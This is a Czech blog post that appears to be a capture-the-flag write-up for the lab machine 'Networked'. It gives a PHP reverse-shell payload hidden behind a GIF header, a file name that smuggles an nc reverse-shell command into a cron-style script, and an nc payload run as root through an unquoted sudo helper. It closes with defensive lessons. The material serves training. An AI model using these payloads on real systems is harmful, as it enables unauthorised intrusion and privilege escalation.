---
layout: post
author: Tomáš Matějíček
title: "Networked"
date: 2020-12-20
tags: ssh sudo php exploit enumeration privesc
---
## Úvod a kontext

Networked je pěkný easy stroj, který ale nespadne na jednom jednorázovém exploitu. První část řetězce je upload bypass ve webové galerii. Druhá část zneužije skript, který periodicky kontroluje názvy uploadovaných souborů a nedostatečně je escapuje. Poslední krok pak vede přes `sudo` na síťový konfigurační skript.

Právě struktura těchto chyb je důležitá. Web dává první RCE jako `apache`, další chyba udělá shell jako `guly` a až teprve potom přijde root. Každá fáze je jiný typ problému a každá vyžaduje jiný způsob uvažování.

## Počáteční průzkum

### Apache s uploadem a veřejným `backup/`

Zvenku jsou vidět jen SSH a Apache, takže první útok bude prakticky jistě přes web. Enumerace navíc ukáže zajímavé cesty `upload.php`, `photos.php`, `uploads/` a `backup/`, takže dává smysl zaměřit se na logiku galerie a nahrávání obrázků.
```bash
nmap -p 1-65535 -T4 -A -sC -v $IP
```
```text
22/tcp  open   ssh     OpenSSH 7.4
80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
```

```text
http://10.10.10.146/uploads/
http://10.10.10.146/backup/
http://10.10.10.146/upload.php
http://10.10.10.146/photos.php
```

## Analýza zjištění

### Upload bypass přes `shell.php.gif`

Záloha webu potvrzuje, že `upload.php` kontroluje hlavně MIME typ a to, zda název končí na povolenou příponu obrázku. To stačí obejít souborem `shell.php.gif`, který pořád vypadá jako GIF, ale zároveň obsahuje PHP payload.
```text
upload Networked-shell.gif
(GIF89a;<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.15.13/4000 0>&1'"); ?>)
```

```text
netcat -lvp 4000
```

Tím vznikne první shell na webu. Na Networked je ale důležité hned pochopit, že jde jen o mezikrok. `apache` nemá `user.txt` ani zajímavá práva, takže je potřeba hledat, co na uploady reaguje lokálně.

### Přes název souboru na `guly`

Další stopa je v tom, že host periodicky kontroluje obsah adresáře `uploads/`. Skript běžící jako `guly` přitom nedostatečně ošetřuje názvy souborů. Pokud se v `uploads/` vytvoří soubor se speciálně zvoleným jménem, skript z něj udělá command injection a spustí příkaz pod účtem `guly`.
```text
netcat -lvp 4001
touch /var/www/html/uploads/"; nc 10.10.15.13 4001 -c bash"
```

Tohle je na Networked klíčový bridge krok. Webový shell sám nic zásadního neřeší, ale dovolí zapsat soubor do správného adresáře a tím vyvolat druhou chybu.

## Získání přístupu

### Shell jako `guly`

Po doběhnutí kontroly uploadů přijde shell jako `guly`, což už je skutečný uživatelský kontext. Tady se vyplatí hned přejít na pohodlnější TTY a ověřit `user.txt`.
```text
python -c 'import pty; pty.spawn("/bin/bash")'
cat /home/guly/user.txt
```
```text
__CENSORED__
```

## Eskalace oprávnění

### `changename.sh` a command injection přes nequotovaný vstup

Na účtu `guly` stačí zkontrolovat `sudo -l`. Výstup ukáže `NOPASSWD` na `/usr/local/sbin/changename.sh`, což je síťový helper, který zapisuje uživatelský vstup do souboru `ifcfg-guly` a následně spouští `ifup`. Problém je v tom, že vstup zapisuje bez uvozovek, takže zadaná hodnota může obsahovat další příkaz.

Praktický postup je jednoduchý: připravit si reverzní shell skript do `/tmp` a potom ho přes vstup do `changename.sh` nechat spustit jako root.
```text
netcat -lvp 4002
echo nc 10.10.15.13 4002 -c bash > /tmp/shell
chmod +x /tmp/shell
sudo /usr/local/sbin/changename.sh
```

Po úspěšném spuštění skriptu už zbývá jen dočíst `root.txt`.
```bash
cat root.txt
```
```text
__CENSORED__
```

## Shrnutí klíčových poznatků

- Networked začíná klasickým upload bypassem, ale sama webová RCE vede jen na málo privilegovaného uživatele.
- Skutečný user foothold otevře až druhá chyba: skript kontrolující uploady, který neescapuje názvy souborů a běží jako `guly`.
- Root část stojí na zranitelném `sudo` helperu `changename.sh`, který zapisuje nequotovaný vstup do shellového kontextu.

## Co si odnést do praxe

- Upload obrázků a jiných příloh nesmí končit v místě, kde je server dokáže vykonat jako skript. `shell.php.gif` ukazuje, jak málo stačí k webshellu.
- Bezpečnost nekončí u webu. Jakýkoli následný processing uploadů, cron či validační skript musí s názvy souborů zacházet jako s nedůvěryhodným vstupem.
- Shellové helpery spouštěné přes `sudo` musí důsledně quotovat proměnné. Jakmile skript zapisuje nebo vykonává neescapovaný vstup, je z administrativní utility přímý root primitivum.
